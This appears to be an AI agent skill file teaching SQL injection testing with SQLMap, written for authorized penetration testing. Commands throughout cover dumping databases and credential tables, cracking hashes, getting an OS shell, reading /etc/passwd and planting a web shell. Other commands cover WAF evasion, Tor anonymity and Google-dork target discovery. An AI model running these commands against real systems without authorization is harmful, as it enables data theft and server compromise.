---
name: sqlmap-database-pentesting
description: "Provide systematic methodologies for automated SQL injection detection and exploitation using SQLMap."
risk: unknown
source: community
author: zebbern
date_added: "2026-02-27"
---

# SQLMap Database Penetration Testing

## Purpose

Provide systematic methodologies for automated SQL injection detection and exploitation using SQLMap. This skill covers database enumeration, table and column discovery, data extraction, multiple target specification methods, and advanced exploitation techniques for MySQL, PostgreSQL, MSSQL, Oracle, and other database management systems.

## Inputs / Prerequisites

- **Target URL**: Web application URL with injectable parameter (e.g., `?id=1`)
- **SQLMap Installation**: Pre-installed on Kali Linux or downloaded from GitHub
- **Verified Injection Point**: URL parameter confirmed or suspected to be SQL injectable
- **Request File (Optional)**: Burp Suite captured HTTP request for POST-based injection
- **Authorization**: Written permission for penetration testing activities

## Outputs / Deliverables

- **Database Enumeration**: List of all databases on the target server
- **Table Structure**: Complete table names within target database
- **Column Mapping**: Column names and data types for each table
- **Extracted Data**: Dumped records including usernames, passwords, and sensitive data
- **Hash Values**: Password hashes for offline cracking
- **Vulnerability Report**: Confirmation of SQL injection type and severity

## Core Workflow

### 1. Identify SQL Injection Vulnerability

#### Manual Verification
```bash
# Add single quote to break query
http://target.com/page.php?id=1'

# If error message appears, likely SQL injectable
# Error example: "You have an error in your SQL syntax"
```

#### Initial SQLMap Scan
```bash
# Basic vulnerability detection
sqlmap -u "http://target.com/page.php?id=1" --batch

# With verbosity for detailed output
sqlmap -u "http://target.com/page.php?id=1" --batch -v 3
```

### 2. Enumerate Databases

#### List All Databases
```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch
```

**Key Options:**
- `-u`: Target URL with injectable parameter
- `--dbs`: Enumerate database names
- `--batch`: Use default answers (non-interactive mode)

### 3. Enumerate Tables

#### List Tables in Specific Database
```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables --batch
```

**Key Options:**
- `-D`: Specify target database name
- `--tables`: Enumerate table names

### 4. Enumerate Columns

#### List Columns in Specific Table
```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns --batch
```

**Key Options:**
- `-T`: Specify target table name
- `--columns`: Enumerate column names

### 5. Extract Data

#### Dump Specific Table Data
```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --dump --batch
```

#### Dump Specific Columns
```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users -C username,password --dump --batch
```

#### Dump Entire Database
```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name --dump-all --batch
```

**Key Options:**
- `--dump`: Extract all data from specified table
- `--dump-all`: Extract all data from all tables
- `-C`: Specify column names to extract

### 6. Advanced Target Options

#### Target from HTTP Request File
```bash
# Save Burp Suite request to file, then:
sqlmap -r /path/to/request.txt --dbs --batch
```

#### Target from Log File
```bash
# Feed log file with multiple requests
sqlmap -l /path/to/logfile --dbs --batch
```

#### Target Multiple URLs (Bulk File)
```bash
# Create file with URLs, one per line:
# http://target1.com/page.php?id=1
# http://target2.com/page.php?id=2
sqlmap -m /path/to/bulkfile.txt --dbs --batch
```

#### Target via Google Dorks (Use with Caution)
```bash
# Automatically find and test vulnerable sites (LEGAL TARGETS ONLY)
sqlmap -g "inurl:?id= site:yourdomain.com" --batch
```

## Quick Reference Commands

### Database Enumeration Progression

| Stage | Command |
|-------|---------|
| List Databases | `sqlmap -u "URL" --dbs --batch` |
| List Tables | `sqlmap -u "URL" -D dbname --tables --batch` |
| List Columns | `sqlmap -u "URL" -D dbname -T tablename --columns --batch` |
| Dump Data | `sqlmap -u "URL" -D dbname -T tablename --dump --batch` |
| Dump All | `sqlmap -u "URL" -D dbname --dump-all --batch` |

### Supported Database Management Systems

| DBMS | Support Level |
|------|---------------|
| MySQL | Full Support |
| PostgreSQL | Full Support |
| Microsoft SQL Server | Full Support |
| Oracle | Full Support |
| Microsoft Access | Full Support |
| IBM DB2 | Full Support |
| SQLite | Full Support |
| Firebird | Full Support |
| Sybase | Full Support |
| SAP MaxDB | Full Support |
| HSQLDB | Full Support |
| Informix | Full Support |

### SQL Injection Techniques

| Technique | Description | Flag |
|-----------|-------------|------|
| Boolean-based blind | Infers data from true/false responses | `--technique=B` |
| Time-based blind | Uses time delays to infer data | `--technique=T` |
| Error-based | Extracts data from error messages | `--technique=E` |
| UNION query-based | Uses UNION to append results | `--technique=U` |
| Stacked queries | Executes multiple statements | `--technique=S` |
| Out-of-band | Uses DNS or HTTP for exfiltration | `--technique=Q` |

### Essential Options

| Option | Description |
|--------|-------------|
| `-u` | Target URL |
| `-r` | Load HTTP request from file |
| `-l` | Parse targets from Burp/WebScarab log |
| `-m` | Bulk file with multiple targets |
| `-g` | Google dork (use responsibly) |
| `--dbs` | Enumerate databases |
| `--tables` | Enumerate tables |
| `--columns` | Enumerate columns |
| `--dump` | Dump table data |
| `--dump-all` | Dump all database data |
| `-D` | Specify database |
| `-T` | Specify table |
| `-C` | Specify columns |
| `--batch` | Non-interactive mode |
| `--random-agent` | Use random User-Agent |
| `--level` | Level of tests (1-5) |
| `--risk` | Risk of tests (1-3) |

## Constraints and Limitations

### Operational Boundaries
- Requires valid injectable parameter in target URL
- Network connectivity to target database server required
- Large database dumps may take significant time
- Some WAF/IPS systems may block SQLMap traffic
- Time-based attacks significantly slower than error-based

### Performance Considerations
- Use `--threads` to speed up enumeration (default: 1)
- Limit dumps with `--start` and `--stop` for large tables
- Use `--technique` to specify faster injection method if known

### Legal Requirements
- Only test systems with explicit written authorization
- Google dork attacks against unknown sites are illegal
- Document all testing activities and findings
- Respect scope limitations defined in engagement rules

### Detection Risk
- SQLMap generates significant log entries
- Use `--random-agent` to vary User-Agent header
- Consider `--delay` to avoid triggering rate limits
- Proxy through Tor with `--tor` for anonymity (authorized tests only)

## Examples

### Example 1: Complete Database Enumeration
```bash
# Step 1: Discover databases
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch
# Result: acuart database found

# Step 2: List tables
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables --batch
# Result: users, products, carts, etc.

# Step 3: List columns
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch
# Result: username, password, email columns

# Step 4: Dump user credentials
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump --batch
```

### Example 2: POST Request Injection
```bash
# Save Burp request to file (login.txt):
# POST /login.php HTTP/1.1
# Host: target.com
# Content-Type: application/x-www-form-urlencoded
# 
# username=admin&password=test

# Run SQLMap with request file
sqlmap -r /root/Desktop/login.txt -p username --dbs --batch
```

### Example 3: Bulk Target Scanning
```bash
# Create bulkfile.txt:
echo "http://192.168.1.10/sqli/Less-1/?id=1" > bulkfile.txt
echo "http://192.168.1.10/sqli/Less-2/?id=1" >> bulkfile.txt

# Scan all targets
sqlmap -m bulkfile.txt --dbs --batch
```

### Example 4: Aggressive Testing
```bash
# High level and risk for thorough testing
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch --level=5 --risk=3

# Specify all techniques
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch --technique=BEUSTQ
```

### Example 5: Extract Specific Credentials
```bash
# Target specific columns
sqlmap -u "http://target.com/page.php?id=1" \
  -D webapp \
  -T admin_users \
  -C admin_name,admin_pass,admin_email \
  --dump --batch

# Automatically crack password hashes
sqlmap -u "http://target.com/page.php?id=1" \
  -D webapp \
  -T users \
  --dump --batch \
  --passwords
```

### Example 6: OS Shell Access (Advanced)
```bash
# Get interactive OS shell (requires DBA privileges)
sqlmap -u "http://target.com/page.php?id=1" --os-shell --batch

# Execute specific OS command
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami" --batch

# File read from server
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd" --batch

# File upload to server
sqlmap -u "http://target.com/page.php?id=1" --file-write="/local/shell.php" --file-dest="/var/www/html/shell.php" --batch
```

## Troubleshooting

### Issue: "Parameter does not seem injectable"
**Cause**: SQLMap cannot find injection point
**Solution**:
```bash
# Increase testing level and risk
sqlmap -u "URL" --dbs --batch --level=5 --risk=3

# Specify parameter explicitly
sqlmap -u "URL" -p "id" --dbs --batch

# Try different injection techniques
sqlmap -u "URL" --dbs --batch --technique=BT

# Add prefix/suffix for filter bypass
sqlmap -u "URL" --dbs --batch --prefix="'" --suffix="-- -"
```

### Issue: Target Behind WAF/Firewall
**Cause**: Web Application Firewall blocking requests
**Solution**:
```bash
# Use tamper scripts
sqlmap -u "URL" --dbs --batch --tamper=space2comment

# List available tamper scripts
sqlmap --list-tampers

# Common tamper combinations
sqlmap -u "URL" --dbs --batch --tamper=space2comment,between,randomcase

# Add delay between requests
sqlmap -u "URL" --dbs --batch --delay=2

# Use random User-Agent
sqlmap -u "URL" --dbs --batch --random-agent
```

### Issue: Connection Timeout
**Cause**: Network issues or slow target
**Solution**:
```bash
# Increase timeout
sqlmap -u "URL" --dbs --batch --timeout=60

# Reduce threads
sqlmap -u "URL" --dbs --batch --threads=1

# Add retries
sqlmap -u "URL" --dbs --batch --retries=5
```

### Issue: Time-Based Attacks Too Slow
**Cause**: Default time delay too conservative
**Solution**:
```bash
# Reduce time delay (risky, may cause false negatives)
sqlmap -u "URL" --dbs --batch --time-sec=3

# Use boolean-based instead if possible
sqlmap -u "URL" --dbs --batch --technique=B
```

### Issue: Cannot Dump Large Tables
**Cause**: Table has too many records
**Solution**:
```bash
# Limit number of records
sqlmap -u "URL" -D db -T table --dump --batch --start=1 --stop=100

# Dump specific columns only
sqlmap -u "URL" -D db -T table -C username,password --dump --batch

# Exclude specific columns
sqlmap -u "URL" -D db -T table --dump --batch --exclude-sysdbs
```

### Issue: Session Drops During Long Scan
**Cause**: Session timeout or connection reset
**Solution**:
```bash
# Save and resume session
sqlmap -u "URL" --dbs --batch --output-dir=/root/sqlmap_session

# Resume from saved session
sqlmap -u "URL" --dbs --batch --resume

# Use persistent HTTP connection
sqlmap -u "URL" --dbs --batch --keep-alive
```

## When to Use
This skill is applicable to execute the workflow or actions described in the overview.
